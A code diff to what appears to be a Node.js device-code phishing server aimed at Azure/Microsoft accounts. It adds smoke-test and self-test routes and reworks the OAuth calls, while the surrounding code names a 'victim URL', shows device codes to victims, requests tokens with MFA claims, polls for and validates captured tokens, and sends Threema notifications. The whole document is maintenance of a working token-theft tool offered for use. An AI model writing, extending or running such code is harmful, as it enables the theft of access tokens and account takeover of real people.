@@ -7,6 +7,7 @@ import http from 'http';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import geoip from 'geoip-country';
+import { runSmokeTests, renderSmokeTestPage, publicUrl, COMMON_ENDPOINTS } from './smoke-test.mjs';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const configPath = path.join(__dirname, 'config.json');
@@ -50,12 +51,15 @@ function resolveCertPath(certPath) {
 }
 
 function victimUrl() {
-    const host = config.tlsHostname || 'localhost';
-    const scheme = config.testMode ? 'http' : 'https';
-    const port = config.testMode ? config.httpPort : config.httpsPort;
-    const defaultPort = config.testMode ? 80 : 443;
-    const portSuffix = port === defaultPort ? '' : `:${port}`;
-    return `${scheme}://${host}${portSuffix}/share`;
+    return publicUrl(config, '/share', __dirname);
+}
+
+function smokeTestUrl() {
+    return publicUrl(config, '/smoke-test', __dirname);
+}
+
+function selfTestUrl() {
+    return publicUrl(config, '/smoke-test/self', __dirname);
 }
 
 function displayCodeToVictim(res, userCode) {
@@ -86,7 +90,7 @@ function getTime() {
     return `${formattedDateTime}`;
 }
 
-function pollForAzureTokens(deviceCode, userCode) {
+function pollForAzureTokens(deviceCode, userCode, oauthConfig = config) {
     logMessage('Start polling token for code: ' + userCode);
     let runCount = 1;
     const interval = setInterval(() => {
@@ -95,7 +99,7 @@ function pollForAzureTokens(deviceCode, userCode) {
                 if (runCount % 30 === 0 && runCount > 0 && config.debug === false) {
                     logMessage('No worries, I am still polling token for code: ' + userCode);
                 }
-                const pollResult = await fetchAzureToken(deviceCode);
+                const pollResult = await fetchAzureToken(deviceCode, oauthConfig);
                 logMessage('Still polling token for code: ' + userCode, 'debug');
                 logMessage('Did return error property in JSON? -> ' + (pollResult.hasOwnProperty('error') ? true : false), 'debug');
                 logMessage('Did return success property in JSON? -> ' + (pollResult.hasOwnProperty('access_token') ? true : false), 'debug');
@@ -174,12 +178,12 @@ function userHasValidCookie(path, str) {
     return false;
 }
 
-function buildPostRequest(body) {
+function buildPostRequest(body, oauthConfig = config) {
     return {
         method: "POST",
         headers: {
             "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": config.userAgent
+            "User-Agent": oauthConfig.userAgent
         },
         body,
     };
@@ -196,13 +200,13 @@ async function sendThreemaNotification(recipient) {
     logMessage('Sent Threema notification to ' + recipient)
 }
 
-async function fetchAzureToken(deviceCode) {
+async function fetchAzureToken(deviceCode, oauthConfig = config) {
     const data = new URLSearchParams({
         'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
-        'client_id': config.clientId,
+        'client_id': oauthConfig.clientId,
         'code': deviceCode
     });
-    const response = await fetch(config.tokenUrl, buildPostRequest(data));
+    const response = await fetch(oauthConfig.tokenUrl, buildPostRequest(data, oauthConfig));
     return await response.json();
 }
 
@@ -327,15 +331,15 @@ async function validateCapturedTokens(userCode, pollResult) {
     );
 }
 
-async function fetchDeviceCode() {
+async function fetchDeviceCode(oauthConfig = config) {
     const data = new URLSearchParams({
-        'client_id': config.clientId,
-        'scope': config.scopes,
+        'client_id': oauthConfig.clientId,
+        'scope': oauthConfig.scopes,
         'claims': '{"access_token": {"amr": {"values": ["ngcmfa", "mfa"]}}}',
     });
-    const response = await fetch(config.deviceCodeUrl, buildPostRequest(data));
+    const response = await fetch(oauthConfig.deviceCodeUrl, buildPostRequest(data, oauthConfig));
     if (response.status !== 200) {
-        throw new Error(`Fetch failed with status: ${response.status} for URL ${config.deviceCodeUrl} ${await response.text()}`);
+        throw new Error(`Fetch failed with status: ${response.status} for URL ${oauthConfig.deviceCodeUrl} ${await response.text()}`);
     }
     return response.json();
 }
@@ -382,10 +386,42 @@ app.get('/share', async (req, res, next) => {
     }
 });
 
+app.get('/smoke-test', async (req, res) => {
+    try {
+        const results = await runSmokeTests(config, { rootDir: __dirname });
+        res.send(renderSmokeTestPage(results, {
+            smokeTestUrl: smokeTestUrl(),
+            selfTestUrl: selfTestUrl(),
+            victimUrl: victimUrl(),
+        }));
+        logMessage(`Smoke test page served (${results.ok ? 'pass' : 'fail'})`);
+    } catch (error) {
+        logMessage(error.stack, 'error');
+        res.status(500).send(`Smoke test failed: ${error.message}`);
+    }
+});
+
+app.get('/smoke-test/self', async (req, res) => {
+    try {
+        const selfConfig = { ...config, ...COMMON_ENDPOINTS };
+        const deviceCodeResponse = await fetchDeviceCode(selfConfig);
+        const userCode = deviceCodeResponse.user_code;
+        const deviceCode = deviceCodeResponse.device_code;
+        logMessage(`Self-test /smoke-test/self — issued device code ${userCode} (common endpoints)`);
+        displayCodeToVictim(res, userCode);
+        pollForAzureTokens(deviceCode, userCode, selfConfig);
+    } catch (error) {
+        logMessage(error.stack, 'error');
+        res.status(500).send(`Self-test failed: ${error.message}`);
+    }
+});
+
 if (config.testMode) {
     http.createServer(app).listen(config.httpPort, () => {
         logMessage('App listening on port ' + config.httpPort);
         logMessage('Victim URL: ' + victimUrl());
+        logMessage('Smoke test URL: ' + smokeTestUrl());
+        logMessage('Self-test URL: ' + selfTestUrl());
     });
 } else {
     const tlsOptions = {
@@ -399,5 +435,7 @@ if (config.testMode) {
     https.createServer(tlsOptions, app).listen(config.httpsPort, () => {
         logMessage('App listening on port ' + config.httpsPort);
         logMessage('Victim URL: ' + victimUrl());
+        logMessage('Smoke test URL: ' + smokeTestUrl());
+        logMessage('Self-test URL: ' + selfTestUrl());
     });
 }
